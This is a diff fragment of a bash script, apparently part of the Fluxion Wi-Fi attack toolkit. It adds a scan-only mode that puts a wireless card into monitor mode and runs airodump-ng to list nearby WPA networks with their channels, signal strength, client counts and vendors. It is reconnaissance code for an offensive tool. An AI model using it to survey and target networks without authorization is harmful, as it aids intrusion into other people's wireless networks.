+    echo "ERROR: No wireless interfaces found." >&2
+    exit 1
+  fi
+
+  local scanInterface=""
+  if [ "$FLUXIONInterface" ]; then
+    # Validate the requested interface exists and is wireless.
+    if interface_is_wireless "$FLUXIONInterface"; then
+      scanInterface="$FLUXIONInterface"
+    else
+      echo "ERROR: Interface '$FLUXIONInterface' is not a wireless interface." >&2
+      exit 1
+    fi
+  else
+    scanInterface="${InterfaceListWireless[0]}"
+  fi
+  echo "Using interface: $scanInterface" >&2
+
+  # Allocate (put into monitor mode).
+  if ! fluxion_allocate_interface "$scanInterface"; then
+    echo "ERROR: Failed to allocate interface $scanInterface" >&2
+    exit 1
+  fi
+
+  # Resolve the monitor-mode interface name.
+  local monInterface="$scanInterface"
+  if [ "${FluxionInterfaces[$scanInterface]}" ]; then
+    monInterface="${FluxionInterfaces[$scanInterface]}"
+    # If original was renamed, the new name is the monitor interface
+    if interface_is_real "$monInterface"; then
+      : # good
+    else
+      monInterface="$scanInterface"
+    fi
+  fi
+
+  # Determine channel/band params.
+  local channelParam=""
+  local bandParam=""
+  if [ "$FluxionTargetChannel" ]; then
+    channelParam="--channel $FluxionTargetChannel"
+    local firstCh=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+    if [ -n "$firstCh" ] && [ "$firstCh" -le 14 ]; then
+      bandParam="--band bg"
+    else
+      bandParam="--band a"
+    fi
+  else
+    bandParam="--band bg"
+  fi
+
+  # Clean old scan files.
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
+
+  # Run scan in background, wait for scan-time, then kill.
+  local scanCmd="airodump-ng -Mat WPA $channelParam $bandParam -w \"$FLUXIONWorkspacePath/dump\" $monInterface"
+  local scanPID
+  fluxion_window_open scanPID "Scanner" "" "#000000" "#FFFFFF" "$scanCmd"
+
+  echo "Scanning for ${FLUXIONScanTime}s..." >&2
+  sleep "$FLUXIONScanTime"
+  fluxion_window_close scanPID
+  sleep 1
+
+  # Parse results.
+  if [ ! -f "$FLUXIONWorkspacePath/dump-01.csv" ] || \
+     [ ! -s "$FLUXIONWorkspacePath/dump-01.csv" ]; then
+    echo "ERROR: No scan results captured." >&2
+    fluxion_deallocate_interface "$scanInterface" 2>/dev/null
+    exit 1
+  fi
+
+  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
+  local candidates
+  readarray candidates < <(
+    awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
+    "$FLUXIONWorkspacePath/dump-01.csv"
+  )
+  local clients
+  readarray clients < <(
+    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
+    "$FLUXIONWorkspacePath/dump-01.csv"
+  )
+
+  if [ ${#candidates[@]} -eq 0 ]; then
+    echo "No WPA networks found." >&2
+    fluxion_deallocate_interface "$scanInterface" 2>/dev/null
+    exit 0
+  fi
+
+  # Build vendor lookup from kismet netxml if available.
+  local -A vendorLookup
+  if [ -f "$FLUXIONWorkspacePath/dump-01.kismet.netxml" ]; then
+    local currentMAC=""
+    while IFS= read -r line; do
+      if [[ "$line" =~ \<BSSID\>([A-F0-9:]+)\</BSSID\> ]]; then
+        currentMAC="${BASH_REMATCH[1]}"
+      elif [[ "$line" =~ \<manuf\>(.+)\</manuf\> ]] && [ -n "$currentMAC" ]; then
+        local manufName="${BASH_REMATCH[1]}"
+        manufName=$(echo "$manufName" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g')
+        if [ "$manufName" != "Unknown" ]; then
+          vendorLookup["$currentMAC"]="$manufName"
+        fi
+        currentMAC=""
+      fi
+    done < "$FLUXIONWorkspacePath/dump-01.kismet.netxml"
+  fi
+
+  # Print header.
+  printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30s %s\n" \
+    "CH" "BSSID" "PWR" "CLNT" "QLTY" "ENC" "VENDOR" "ESSID"
+  printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30s %s\n" \
+    "---" "-----------------" "---" "-----" "----" "----------" "------------------------------" "----"
+
+  # Print each network.
+  local info
+  for info in "${candidates[@]}"; do
+    info=$(echo "$info" | sed -r "s/,\s*/,/g")
+
+    local mac=$(echo "$info" | cut -d , -f 1)
+    local channel=$(echo "$info" | cut -d , -f 4 | tr -d ' ')
+    local security=$(echo "$info" | cut -d , -f 6)
+    local power=$(echo "$info" | cut -d , -f 9)
+    local essid=$(echo "$info" | cut -d , -f 14 | sed 's/^ //;s/ *$//')
+
+    local clientCount=$(echo "${clients[@]}" | grep -c "$mac" 2>/dev/null || echo 0)
+
+    local vendor="${vendorLookup[$mac]}"
+    if [ -z "$vendor" ]; then
+      vendor=$(macchanger -l 2>/dev/null | grep -i "${mac:0:8}" | cut -d ' ' -f 5- | head -1)
+    fi
+
+    # Calculate quality.
+    local quality
+    if [ "$power" -eq -1 ] 2>/dev/null; then
+      quality="??"
+    elif [ "$power" -le -90 ] 2>/dev/null; then
+      quality="0%"
+    elif [ "$power" -gt -60 ] 2>/dev/null; then
+      quality="100%"
+    else
+      quality="$(( (power * 10 - (-90) * 10) / ((-60 - (-90)) / 10) ))%"
+    fi
+
+    printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30.30s %s\n" \
+      "$channel" "$mac" "$power" "$clientCount" "$quality" "$security" "${vendor:--}" "$essid"
+  done
+
+  echo >&2
+  echo "${#candidates[@]} network(s) found." >&2
+
+  # Cleanup.
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
+  fluxion_deallocate_interface "$scanInterface" 2>/dev/null
+
+  exit 0
+}
+
+# ============================================================ #
 # ===================== < FLUXION Loop > ===================== #
 # ============================================================ #
 fluxion_main() {
+  # If scan-only mode, run the scan and exit.
+  if [ "$FLUXIONScanOnly" ]; then
+    fluxion_scan_only
+  fi
+
   fluxion_startup
 
   fluxion_set_resolution
